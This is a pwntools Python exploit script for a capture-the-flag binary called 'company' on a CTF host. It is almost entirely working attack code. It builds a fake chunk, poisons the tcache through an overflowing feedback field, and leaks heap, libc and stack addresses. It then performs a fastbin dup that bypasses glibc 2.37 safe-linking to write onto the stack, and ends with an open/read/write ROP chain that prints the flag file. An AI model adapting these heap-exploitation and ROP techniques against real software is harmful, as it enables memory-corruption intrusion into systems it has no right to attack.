#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('company')
libc = ELF('libc.so.6')

host = args.HOST or 'company.chal.crewc.tf'
port = int(args.PORT or 17001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def create_empl(index, name, position, salary):
    io.sendlineafter(b'>> ',b'1')
    io.sendlineafter(b'Index: ', str(index))
    io.sendafter(b'Name: ', name)
    io.sendafter(b'Position: ', position)
    io.sendlineafter(b'Salary: ', str(salary))

def del_empl(index):
    io.sendlineafter(b'>> ',b'2')
    io.sendlineafter(b'Index: ', str(index))

def create_feedback(index_me, index_empl, feedback):
    io.sendlineafter(b'>> ',b'3')
    io.sendlineafter(b'Which Employee you are? ', str(index_me))
    io.sendlineafter(b'Which Employee you want to give feedback? ', str(index_empl))
    io.sendafter(b'Feedback: ', feedback)

def view_feedback(index_empl):
    io.sendlineafter(b'>> ',b'4')
    io.sendlineafter(b"Which Employee's feedback you wanna see? ", str(index_empl))

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
decompiler connect ghidra
# b *0x000000000040131c
# continue
# jump *0x00000000004013b7
b give_feedback
continue
c 17
b *0x0000000000401770
continue
'''.format(**locals())

"""
  puts("1. Register Employee");
  puts("2. Fired Employee");
  puts("3. Feedback Employee");
  puts("4. View Feedback Employee");
"""

# -- Exploit goes here --
# 2.37-0ubuntu2_amd64

exe.sym['name'] = 0x00404060

io = start()

# Name will be a fake chunk 
p = p64(0x6) + p64(0x61)
io.sendafter(b"What is your name?",p)

create_empl(0, b'toto', b'HR', 1)
create_feedback(0, 0, b'\x41'*0x40 + p64(exe.sym['name'] + 0x10))

del_empl(0)

create_empl(0, b'toto', b'HR', 1)
del_empl(0)

# First chunk in tcache = global variable name
# Next, overwrite the position
create_empl(0, b'\0'*0x10+b'HR\0', b'HR', 0)

create_empl(1, b'toto', b'HR\0', 1)
create_feedback(1, 1, b'\0'*0x48)

del_empl(1)

create_empl(1, b'toto', b'HR', 1)
create_empl(2, b'toto', b'HR', 1)

del_empl(1)
view_feedback(2)

io.recvuntil(b'Feedback: ')
leak = u64(io.recvline(keepends=False).ljust(8,b'\0'))

log.info(f"{leak = :x}")

## Leak libc
create_feedback(2, 2, b'\x41'*0x40 + p64(exe.sym['stdin']))
del_empl(2)

create_empl(1, b'toto', b'HR\0', 1)

view_feedback(1)
io.recvuntil(b'Feedback: ')
libc_leak = u64(io.recvline(keepends=False).ljust(8,b'\0'))
libc.address = libc_leak - 0x1f6aa0# libc.sym['stdin']
log.info(f"{libc_leak = :x} {libc.address = :x}")

## Leak stack
create_empl(2, b'toto', b'HR', 1)
create_feedback(2, 2, b'\x41'*0x40 + p64(libc.sym['environ']))
del_empl(2)
create_empl(2, b'toto', b'HR\0', 1)
view_feedback(2)
io.recvuntil(b'Feedback: ')
stack_leak = u64(io.recvline(keepends=False).ljust(8,b'\0'))
log.info(f"{stack_leak = :x}")

# Fast bin dup
for i in range(3, 7):
    create_empl(i, b'toto', b'HR', 1)
    create_feedback(i, i, b'\x00'*0x48)

create_empl(7, b'toto', b'HR', 1)
create_feedback(7, 7, b'\x00'*0x48)

for i in range(3,7):
    del_empl(i)

del_empl(7)

for i in range(3,7):
    create_empl(i, b'toto', b'HR', 1)
    create_feedback(i, i, b'\x00'*0x48)

create_empl(7, b'toto0', b'HR', 1)
create_empl(8, b'toto1', b'HR', 1)

for i in range(3,6):
    del_empl(i)

del_empl(7)
del_empl(6)
del_empl(8)

## Here fastbin dup
for i in range(3,6):
    create_empl(i, b'toto', b'HR', 1)
    create_feedback(i, i, b'\x00'*0x48)
create_empl(6, b'toto', b'HR', 1)

# create_empl(7, b'toto4', b'HR', 1)
# create_empl(8, b'toto5', b'HR', 1)

log.info(f"{stack_leak - 0x160 = :x} ")

p = p64((stack_leak - (0x160+8)) ^ (leak+1))
create_feedback(6, 6,p)

create_empl(7, b'toto4', b'HR', 1)
create_empl(8, b'toto5', b'HR', 1)

exe.sym['main'] = 0x000000000040192e

rop = ROP([exe,libc], base=stack_leak-0x160)
# open('.', O_DIRECTORY)
# rop.rdi = AppendedArgument(['.'], 0x0)
# rop.rsi = 0x0200000
# rop.rax = 0x2
# rop.raw(rop.find_gadget(['syscall','ret']))
# rop.main()
# read(0, stack, 0x1000)
rop.rdi = 0
#rop.rsi = (stack_leak - 0x160)+0x50
rop.rdx = 0x1000
rop.rax = 0x0
rop.raw(rop.find_gadget(['syscall','ret']))

print(rop.dump())

p = p64(0xdeadbeef) # rbp
p += rop.chain() 
create_feedback(8, 8,p)

OFFSET = cyclic_find(0x6161616161616169, n=8)

rop = ROP([exe,libc], base=stack_leak-0x128)
# #open('.', O_DIRECTORY)
# rop.rdi = AppendedArgument(['.'], 0x0)
# rop.rsi = 0#0x0200000
# rop.rax = 0x2
# rop.raw(rop.find_gadget(['syscall','ret']))
# # getdents(3, bss, 0x100)
# rop.rdi = 3
# rop.rsi = exe.bss()
# rop.rdx = 0x100
# rop.rax = 78
# rop.raw(rop.find_gadget(['syscall','ret']))
# # write
# rop.rdi = 1
# rop.rsi = exe.bss()
# rop.rdx = 0x100
# rop.rax = 1
# rop.raw(rop.find_gadget(['syscall','ret']))
#open('.', O_DIRECTORY)
rop.rdi = AppendedArgument(['./flag_you_found_this_my_treasure_leaked.txt'], 0x0)
rop.rsi = 0#0x0200000
rop.rax = 0x2
rop.raw(rop.find_gadget(['syscall','ret']))
# read(3, bss, 0x100)
rop.rdi = 3
rop.rsi = exe.bss()
rop.rdx = 0x100
rop.rax = 0
rop.raw(rop.find_gadget(['syscall','ret']))
# write
rop.rdi = 1
rop.rsi = exe.bss()
rop.rdx = 0x100
rop.rax = 1
rop.raw(rop.find_gadget(['syscall','ret']))

p = b'A'*OFFSET
p += rop.chain()
io.sendline(p)

data = io.recv(0x100)
print(data)

io.interactive()

